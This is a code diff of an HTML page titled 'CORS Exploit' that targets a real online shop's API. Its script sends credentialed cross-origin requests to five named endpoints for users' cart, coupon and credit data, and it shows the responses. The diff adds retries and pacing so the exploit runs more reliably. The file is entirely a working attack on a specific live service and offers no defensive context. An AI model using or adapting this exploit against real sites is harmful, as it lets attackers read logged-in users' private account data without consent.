@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>CORS Exploit</title>
+
 <style>
 body {
     font-family: Arial;
@@ -10,6 +11,7 @@ body {
     color: white;
     padding: 20px;
 }
+
 button {
     padding: 10px 20px;
     font-size: 16px;
@@ -19,95 +21,215 @@ button {
     color: black;
     margin-bottom: 20px;
 }
+
 .container {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
     gap: 15px;
 }
+
 .card {
     padding: 15px;
     border-radius: 10px;
     background: #1e293b;
     box-shadow: 0 0 10px rgba(0,0,0,0.5);
 }
+
 .success { border-left: 5px solid #22c55e; }
 .fail { border-left: 5px solid #ef4444; }
+
 .loading {
     opacity: 0.6;
 }
+
 pre {
     white-space: pre-wrap;
     word-break: break-word;
     font-size: 12px;
 }
 </style>
+
 </head>
 <body>
 
-<h2>CORS Exploit (Live Requests Only)</h2>
+<h2>CORS Exploit (Live Authenticated Requests)</h2>
+
 <button onclick="runExploit()">Run Exploit</button>
 
 <div class="container" id="results"></div>
 
 <script>
+
 const endpoints = [
-    "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-    "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-    "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-    "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-    "https://www.opposhop.cn/cn/oapi/credits/web/credits/show"
+
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+
+"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
+
+"https://www.opposhop.cn/cn/oapi/credits/web/credits/show"
+
 ];
 
+
+
 function createCard(url) {
-    const div = document.createElement("div");
-    div.className = "card loading";
 
-    div.innerHTML = `
-        <b>${url}</b><br>
-        Status: <span class="status">Loading...</span>
-        <pre></pre>
-    `;
+const div = document.createElement("div");
 
-    document.getElementById("results").appendChild(div);
-    return div;
+div.className = "card loading";
+
+div.innerHTML = `
+<b>${url}</b><br>
+Status: <span class="status">Loading...</span>
+<pre></pre>
+`;
+
+document.getElementById("results").appendChild(div);
+
+return div;
+
 }
+
+
+
+function sleep(ms) {
+
+return new Promise(resolve => setTimeout(resolve, ms));
+
+}
+
+
+
+async function fetchWithRetry(url, retries = 3) {
+
+for (let i = 0; i < retries; i++) {
+
+try {
+
+const res = await fetch(url, {
+
+method: "GET",
+
+credentials: "include",
+
+mode: "cors",
+
+cache: "no-store",
+
+headers: {
+
+"Accept": "application/json"
+
+}
+
+});
+
+
+
+if (res.status === 200) {
+
+return res;
+
+}
+
+
+
+} catch (err) {}
+
+
+
+await sleep(1200);
+
+}
+
+
+
+throw "Failed after retries";
+
+}
+
+
 
 async function fetchData(url) {
-    const card = createCard(url);
-    const statusEl = card.querySelector(".status");
-    const pre = card.querySelector("pre");
 
-    try {
-        
-        const uniqueUrl = url + (url.includes("?") ? "&" : "?") + "t=" + Date.now();
+const card = createCard(url);
 
-        const res = await fetch(uniqueUrl, {
-            method: "GET",
-            credentials: "include",
-            cache: "no-store"
-        });
+const statusEl = card.querySelector(".status");
 
-        const text = await res.text();
+const pre = card.querySelector("pre");
 
-        card.classList.remove("loading");
-        card.classList.add(res.status === 200 ? "success" : "fail");
 
-        statusEl.innerText = res.status;
-        pre.innerText = text;
 
-    } catch (e) {
-        card.classList.remove("loading");
-        card.classList.add("fail");
+try {
 
-        statusEl.innerText = "Error";
-        pre.innerText = e;
-    }
+const uniqueUrl = url +
+
+(url.includes("?") ? "&" : "?") +
+
+"t=" + Date.now();
+
+
+
+const res = await fetchWithRetry(uniqueUrl);
+
+
+
+const text = await res.text();
+
+
+
+card.classList.remove("loading");
+
+card.classList.add("success");
+
+
+
+statusEl.innerText = res.status;
+
+pre.innerText = text;
+
+
+
+} catch (e) {
+
+card.classList.remove("loading");
+
+card.classList.add("fail");
+
+
+
+statusEl.innerText = "Error";
+
+pre.innerText = e;
+
 }
 
-function runExploit() {
-    document.getElementById("results").innerHTML = "";
-    endpoints.forEach(fetchData);
 }
+
+
+
+async function runExploit() {
+
+document.getElementById("results").innerHTML = "";
+
+
+
+for (const endpoint of endpoints) {
+
+await fetchData(endpoint);
+
+
+
+await sleep(700);
+
+}
+
+}
+
 </script>
 
 </body>
